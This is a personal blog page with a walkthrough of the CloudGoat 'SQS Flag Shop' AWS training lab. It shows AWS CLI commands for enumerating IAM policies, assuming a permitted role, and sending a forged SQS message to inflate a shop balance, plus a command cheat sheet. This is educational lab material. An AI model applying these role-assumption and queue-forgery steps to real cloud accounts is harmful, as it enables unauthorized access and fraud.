@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png" />
+  <link rel="manifest" href="../../favicon/site.webmanifest" />
+  <link rel="mask-icon" href="../../favicon/safari-pinned-tab.svg" color="#5bbad5" />
+
+  
+  <meta name="msapplication-TileColor" content="#da532c" />
+  <meta name="theme-color" content="#ffffff" />
+
+  
+  <title itemprop="name"> Cloudgoat SQS Flag Shop | Personal Portfolio 
+</title>
+<meta name="description" content="A biomedical engineering student and cybersecurity enthusiast" />
+<meta property="og:title" content="Cloudgoat SQS Flag Shop | Personal Portfolio" />
+<meta name="twitter:title" content="Cloudgoat SQS Flag Shop | Personal Portfolio" />
+<meta itemprop="name" content="Cloudgoat SQS Flag Shop | Personal Portfolio" />
+<meta name="application-name" content="Cloudgoat SQS Flag Shop | Personal Portfolio" />
+<meta property="og:description"
+      content="A biomedical engineering student and cybersecurity enthusiast" />
+<meta property="og:site_name" content="Personal Portfolio" />
+<meta property="og:url" content="http://localhost:1313/posts/sqsflagshop_cloudgoat-walkthrough/" />
+<meta property="og:locale" content="en">
+<meta property="og:image" content="/assets/images/posts/sqsFlagShop_cloudgoat_challenge_logo.png" />
+<meta property="og:image:secure_url" content="http://localhost:1313/assets/images/posts/sqsFlagShop_cloudgoat_challenge_logo.png" />
+<meta property="og:type" content="article" />
+
+
+  
+  <script>
+    if (
+      localStorage.getItem('color-theme') === 'dark' ||
+      (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
+    ) {
+      document.documentElement.classList.add('dark');
+    } else {
+      document.documentElement.classList.remove('dark');
+    }
+  </script>
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper/css/effect-coverflow.min.css" />
+
+  
+  
+  
+    
+    <link rel="stylesheet" href="/css/style.min.0a202f217b79b733be0a4bee09017a95c0ee1defd72592123773a706d3fe0e1f.css" integrity="sha256-CiAvIXt5tzO+CkvuCQF6lcDuHe/XJZISN3OnBtP+Dh8=" />
+  
+
+  
+  <link rel="stylesheet" href="../../css/custom-swiper.css" />
+</head>
+
+</head>
+
+<body class="bg-zinc-100 dark:bg-gray-800">
+    <div class="top-0 z-50 w-full text-gray-700 bg-gray-300 border-b border-gray-300 dark:text-gray-300 dark:bg-gray-900 dark:border-gray-700 md:sticky">
+    <div x-data="{ open: false }" class="flex flex-col max-w-full px-4 mx-auto md:items-center md:justify-between md:flex-row md:px-6 lg:px-8">
+        <div class="flex flex-row items-center justify-between p-4">
+            <a href="../../"
+            class="flex
+                    text-gray-700 dark:text-gray-300
+                    transition-colors
+                    hover:text-gray-900 dark:hover:text-white"
+            >
+            <img
+                src="../../images/cyber-immuno-fusion.png"
+                class="transition-opacity h-9 w-9
+                    hover:opacity-50 focus:opacity-70"
+                alt="Personal Portfolio Logo"
+            />
+            <div
+                class="mt-1 ml-3 text-xl font-black tracking-tight
+                    text-gray-700 dark:text-gray-300 uppercase
+                    transition-colors
+                    hover:text-gray-400 dark:hover:text-white"
+            >
+                Personal Portfolio
+            </div>
+            </a>
+            <button class="rounded-lg md:hidden focus:outline-none focus:shadow-outline" @click="open = !open" role="navigation" aria-expanded="false" aria-label="Main" aria-controls="menuItems">
+                <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6">
+                    <path x-show="!open" fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM9 15a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z" clip-rule="evenodd"></path>
+                    <path x-show="open" fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                </svg>
+            </button>
+        </div>
+        <nav :class="{'flex': open, 'hidden': !open}" class="flex-col flex-grow hidden pb-4 md:pb-0 md:flex md:justify-end md:flex-row">
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/" title="Home">
+                Home
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/about/" title="About">
+                About
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/biomedical/" title="Biomedical">
+                Biomedical
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/software/" title="Software">
+                Software
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/cybersecurity/" title="Cybersecurity">
+                Cybersecurity
+            </a>
+            
+            
+            
+            <button id="theme-toggle" type="button" class="p-2 text-sm text-gray-500 rounded-lg md: dark:text-gray-400 md:hover:bg-gray-100 dark:md:hover:bg-gray-700 md:focus:outline-none md:focus:ring-4 md:focus:ring-gray-200 dark:md:focus:ring-gray-700 md:ml-2 xs:hidden">
+                <svg id="theme-toggle-dark-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z">
+                    </path>
+                </svg>
+                <svg id="theme-toggle-light-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" aria-label="Dark or Light Mode" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path>
+                </svg>
+            </button>
+            
+        </nav>
+    </div>
+</div>
+    
+<article>
+  <header class="mb-4 bg-primary-600">
+    <span class="py-96">
+      <h1 class="py-16 text-5xl font-black text-center text-white capitalize">
+        Cloudgoat SQS Flag Shop
+      </h1>
+    </span>
+  </header>
+  <div class="max-w-4xl mx-auto mt-8 mb-2">
+    <div class="px-6">
+      
+      
+      
+      
+      
+      
+      <img src="../../../assets/images/posts/sqsFlagShop_cloudgoat_challenge_logo_hu_baac66664d6941c6.webp" srcset=", /../assets/images/posts/sqsFlagShop_cloudgoat_challenge_logo_hu_c2ea6d31a757d809.webp 400w, /../assets/images/posts/sqsFlagShop_cloudgoat_challenge_logo_hu_404f17e9d724e816.webp 550w, /../assets/images/posts/sqsFlagShop_cloudgoat_challenge_logo_hu_574cf18da7f6892d.webp 768w, /../assets/images/posts/sqsFlagShop_cloudgoat_challenge_logo_hu_baac66664d6941c6.webp 1100w"
+           class="object-fill overflow-hidden rounded-lg shadow-lg ring-4 ring-zinc-300/40 dark:ring-gray-900/40 shadow-neutral-100/20 dark:shadow-neutral-800/40"
+           width="100%" alt="" />
+      
+      
+    </div>
+  </div>
+  
+  <div class="max-w-2xl px-6 pt-6 pb-16 mx-auto prose dark:prose-invert dark:text-white">
+    <h1 id="introduction--context">Introduction &amp; Context</h1>
+<p>Hey guys, this is a write-up for the sns_secrets challenge from Cloudgoat, available <a href="https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sqs_flag_shop/README.md">here</a>. This lab involves a bit of simple web recon, source code analysis &amp; using simple queue service (sqs) to gain access to the flag. Note this lab does set up EC2, which you can be charged for if you leave it running too long. This the final lab left in the easy category of the cloudgoat challenges. I tried to challenge myself to this mostly manually, so I&rsquo;ll give my thought process for doing it by hand. Now to the lab!</p>
+<h1 id="setup">Setup</h1>
+<p>If you haven&rsquo;t started cloudgoat yet, you can start with <code>cloudgoat create sqs_flag_shop</code>. This one does takea. while (~10 minutes) to boot up. Patience. Once it&rsquo;s set, you&rsquo;ll get a pair of credentials as well as ip address. Record the 3 bits of info down. Set up an AWS profile using <code>aws configure --profile sqsuser</code>. I set the region as <code>us-east-1</code> and format to <code>json</code>.</p>
+<p>Of course, make sure to validate the credentials by running <code>aws sts get-caller-identity --profile sqsuser</code>. It should work just fine. Now to start!</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>We&rsquo;ll need to check out both the website and the user to determine how we can purchase the flag. Let&rsquo;s start by doing the website first. You can of course enumerate the user too first, but you&rsquo;ll need to do both eventually to get our flag.</p>
+<h2 id="website">Website</h2>
+<p>First let&rsquo;s go to the website, it&rsquo;ll be something like <code>http://3.231.22.229:5000</code>. You should get a warning about the website, as it is running just HTTP isntead of the secure HTTPS. The issue with HTTP sites is that your information is sent through cleartext so anyone can see how you interact with it. That&rsquo;s fine in our case as we are running a lab on a website designed intentionally for this. In any other case, avoid using HTTP unless absolutely neccesary.</p>
+<p>On the website, you&rsquo;ll be shown a few images (items to purchase), as well as a total asset count. Feel free to investigate the charge and receipt panel too. But I&rsquo;m going to start off with inspecting the source code. More often than not, CTFs have something hidden in the page source code. Simply right click and click <code>view page source code</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">--</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/charge_cash/&lt;cash&gt;&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">charge_cash</span>(cash):
+</span></span><span style="display:flex;"><span>    cash <span style="color:#f92672">=</span> int(cash)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> cash<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> cash<span style="color:#f92672">==</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">or</span> cash<span style="color:#f92672">==</span><span style="color:#ae81ff">10</span>:
+</span></span><span style="display:flex;"><span>        msg <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;charge_amount&#34;</span> : cash}
+</span></span><span style="display:flex;"><span>        message_body <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(msg)
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> sqs<span style="color:#f92672">.</span>sqs_client<span style="color:#f92672">.</span>send_message(
+</span></span><span style="display:flex;"><span>          QueueUrl<span style="color:#f92672">=</span>sqs<span style="color:#f92672">.</span>sqs_queue_url, 
+</span></span><span style="display:flex;"><span>          MessageBody<span style="color:#f92672">=</span>message_body
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;index&#39;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;BAD Request!!&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--&gt;</span>
+</span></span></code></pre></div><p>Now this. This is interesting. This is a python script, and the note tells us that this is what the backend uses. All this code is doing is it takes in a parameter, does some logic and then responds. If the cash value is 1,5, or 10, it sends an SQS request to increase our value. Unfortunately it also forces a sleep of 10 seconds, so we can&rsquo;t spam charge and get our assets that way. We can&rsquo;t also send a custom cash value as that would be rejected. Our only choice is to bypass this function and directly access the SQS service.</p>
+<p>Looking into the message being set, the message seems to be a pretty simple one. According to the msg line, it should look like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;charge_amount&#34;</span>:<span style="color:#ae81ff">500</span>}
+</span></span></code></pre></div><p>Alright, so that&rsquo;s a plan. We need to send a message to this sqs service, with an absurdly large asset value so that we can purchase the flag.</p>
+<h2 id="aws-environment">AWS Environment</h2>
+<p>Alright, let&rsquo;s take a look at our environment now. We&rsquo;re going to be doing this entirely manually this time, so be prepared to run some long commands.</p>
+<p>Let&rsquo;s start by checking what policies are attached to us using <code>aws iam list-user-policies --user-name cg-sqs-user-cgid8as1kkguen --profile sqsuser</code>. The username you can grab by taking the value after user in the arn property of the response from the sts get caller id call we did earlier.</p>
+<p>That should respond with a PolicyNames object with a value like <code>cg-sqs-scenario-assumed-role</code>. We can use that to look into what we can and can not do. Run <code>aws iam get-user-policy --user-name cg-sqs-user-cgid8as1kkguen --policy-name cg-sqs-scenario-assumed-role --profile sqsuser</code> to see. I got this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;UserName&#34;</span>: <span style="color:#e6db74">&#34;cg-sqs-user-cgid8as1kkguen&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyName&#34;</span>: <span style="color:#e6db74">&#34;cg-sqs-scenario-assumed-role&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyDocument&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Statement&#34;</span>: [
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Action&#34;</span>: [
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;iam:Get*&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;iam:List*&#34;</span>
+</span></span><span style="display:flex;"><span>                ],
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Resource&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;sts:AssumeRole&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Resource&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::381491899745:role/cg-sqs-send-message-cgid8as1kkguen&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Interesting. We have all IAM permissions to get and list, but also a single assume role on a single resource. That is a good telltale sign we should take on that role. So let&rsquo;s try. Assume that role (you can choose any role session name): <code>aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg-sqs-send-message-cgid8as1kkguen --role-session-name hacker --profile sqsuser</code>. Copy and paste the entire response into your notes, you&rsquo;ll need to set the token manually.</p>
+<p>Now let&rsquo;s see what the role can do. Run <code>aws iam list-role-policies --role-name cg-sqs-send-message-cgid8as1kkguen --profile sqsuser</code>, and you&rsquo;ll see the role has a single policy attached: <code>cg-sqs</code>. Grab it&rsquo;s details using <code>aws iam get-role-policy --role-name cg-sqs-send-message-cgid8as1kkguen --profile sqsuser --policy-name cg-sqs</code>. The result should be</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;RoleName&#34;</span>: <span style="color:#e6db74">&#34;cg-sqs-send-message-cgid8as1kkguen&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyName&#34;</span>: <span style="color:#e6db74">&#34;cg-sqs&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyDocument&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Statement&#34;</span>: [
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Action&#34;</span>: [
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;sqs:GetQueueUrl&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;sqs:SendMessage&#34;</span>
+</span></span><span style="display:flex;"><span>                ],
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Resource&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:sqs:us-east-1:381491899745:cash_charging_queue&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So this role, can do a couple things on sqs. It can grab a queue url and send a message. Taking a guess, we probably need to call the getQueueUrl first, so that we can send the message. But note a couple things before moving on.</p>
+<ol>
+<li>Running <code>assume-role</code>, does NOT mean your profile itself gains the permissions of the role. That simply gives a set of credentials that you need to now configure before you can actually take on the role.</li>
+<li>The resource right below the Efffect property contains a piece of critical information. Don&rsquo;t just ignore the little things in responses you get. That contains the queue-name at the end, <code>cash_charging_queue</code>. I myself am used to finding things like this in the website, not in responses querying roles. But that is something we will need later on.</li>
+</ol>
+<p>Before we actually use SQS, let&rsquo;s take a moment to learn what SQS is. According to <a href="https://aws.amazon.com/sqs/">this</a>, it&rsquo;s a message queuing service that can be used in a variety of places. It allows you to send, store and receive messages between storage components, kind of like an API in a sense. But it&rsquo;s meant for relatively quick calls instead of intensive tasks, where the &ldquo;action&rdquo; can be seperate from a &ldquo;response&rdquo; to the front end.</p>
+<h1 id="abuse-sqs">Abuse SQS</h1>
+<p>Start by setting up a profile for that role by doing a simple <code>aws configure --profile sqssuper</code> and passing in the normal values (region is still <code>us-east-1</code> and format as <code>json</code>). But you&rsquo;ll need to add that long token using <code>aws configure set profile.sqssuper.aws_session_token PASTEVALUEHERE</code>. Run a quick <code>aws sts get-caller-identity --profile sqssuper</code> before moving on.</p>
+<p>We&rsquo;ll need to grab the queue url first, but how? The aws documentation <a href="https://docs.aws.amazon.com/cli/latest/reference/sqs/">here</a> has all the commands we will need. The first command is <code>aws sqs get-queue-url --profile sqssuper --queue-name cash_charging queue</code>. That should give you a url to use.</p>
+<p>Now we can check the documentation again, and you&rsquo;ll notice you can send the message using something like <code>aws sqs send-message --profile sqssuper --queue-url https://sqs.us-east-1.amazonaws.com/381491899745/cash_charging_queue --message-body '{&quot;charge_amount&quot; : 100000000}'</code>. Running that should give you the extra assets we need.</p>
+<h1 id="grabbing-the-flag">Grabbing the flag</h1>
+<p>Now head back to the website, and refresh if needed. You should now have enough assets to purchase the flag! After purchasing, just visit the receipts page and you&rsquo;ll see your flag. And we&rsquo;re done!</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This was a nice concluding lab for this section, where we had to do some basic web recon along with learning another amazon service. We started by searching through source code, finding the back-end code, then assumed a role and sent a message giving us plenty of assets. This lab shows how it&rsquo;s important to secure services so that only authorized users can call them.</p>
+<p><em>Don&rsquo;t forget to destroy your lab after! This lab does take a while (~10 minutes). The first time I tried, it got stuck and was unable to destroy it. If this happens, cancel the current cloudgoat call by calling control/command + c, and then head to the AWS Web console. Then search for the component that wasn&rsquo;t being destroyed (eg. VPC, Security Group, etc ). Some require other resources to be destroyed first (I needed to destroy my VPC). Then you should run the command once more to ensure your local data is destroyed and any remnants are removed.</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat destroy sqs_flag_shop
+</span></span></code></pre></div><h1 id="cheat-sheet">Cheat Sheet</h1>
+<p>To close off, here&rsquo;s a quick summary of the commands we needed to run to complete this module. If you&rsquo;re ever coming back to this and just need that one command, this is the section to check.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Start Up</span>
+</span></span><span style="display:flex;"><span>cloudgoat create sqs_flag_shop
+</span></span><span style="display:flex;"><span>aws configure --profile sqsuser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Website analysis</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate environment</span>
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile sqsuser
+</span></span><span style="display:flex;"><span>aws iam list-user-policies --user-name cg-sqs-user-cgid8as1kkguen --profile sqsuser   
+</span></span><span style="display:flex;"><span>aws iam get-user-policy --user-name cg-sqs-user-cgid8as1kkguen --policy-name cg-sqs-scenario-assumed-role --profile sqsuser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Look into the role</span>
+</span></span><span style="display:flex;"><span>aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg-sqs-send-message-cgid8as1kkguen --role-session-name hacker --profile sqsuser
+</span></span><span style="display:flex;"><span>aws iam list-role-policies --role-name cg-sqs-send-message-cgid8as1kkguen --profile sqsuser 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;cg-sqs&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>aws iam get-role-policy --role-name cg-sqs-send-message-cgid8as1kkguen --profile sqsuser --policy-name cg-sqs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Configure the role</span>
+</span></span><span style="display:flex;"><span>aws configure --profile sqssuper
+</span></span><span style="display:flex;"><span>aws configure set profile.sqssuper.aws_session_token TOKENGOESHERE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Use SQS</span>
+</span></span><span style="display:flex;"><span>aws sqs get-queue-url --profile sqssuper --queue-name cash_charging_queue
+</span></span><span style="display:flex;"><span>aws sqs send-message --profile sqssuper --queue-url https://sqs.us-east-1.amazonaws.com/381491899745/cash_charging_queue --message-body <span style="color:#e6db74">&#39;{&#34;charge_amount&#34; : 100000000}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Destroy</span>
+</span></span><span style="display:flex;"><span>cloudgoat destroy sqs_flag_shop
+</span></span></code></pre></div><pre tabindex="0"><code></code></pre>
+  </div>
+</article>
+
+    
+
+<script src="../../js/darkmode.js" defer></script>
+<script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+
+<footer class="bg-gray-200 dark:bg-gray-900 border-t border-gray-300 dark:border-gray-700">
+  <div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8">
+
+    
+    <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/about/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          About
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/biomedical/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Biomedical
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/software/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Software
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/cybersecurity/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Cybersecurity
+        </a>
+      </div>
+      
+    </nav>
+
+    
+    <p class="mt-8 text-base text-center text-gray-600 dark:text-gray-400">
+      &copy; 2025 Personal Portfolio. All rights reserved.
+    </p>
+
+    
+    <p class="mt-2 text-base text-center text-gray-800 dark:text-gray-300">
+      Theme made with ❤️ by
+      <a href="https://nusserstudios.com"
+         class="hover:underline text-gray-800 dark:text-gray-300 hover:text-black dark:hover:text-white transition-colors">
+        <span class="font-black uppercase">Nusser</span>
+        <span class="font-light uppercase">Studios.</span>
+      </a>
+    </p>
+
+  </div>
+</footer>
+
+</body>
+
+</html>
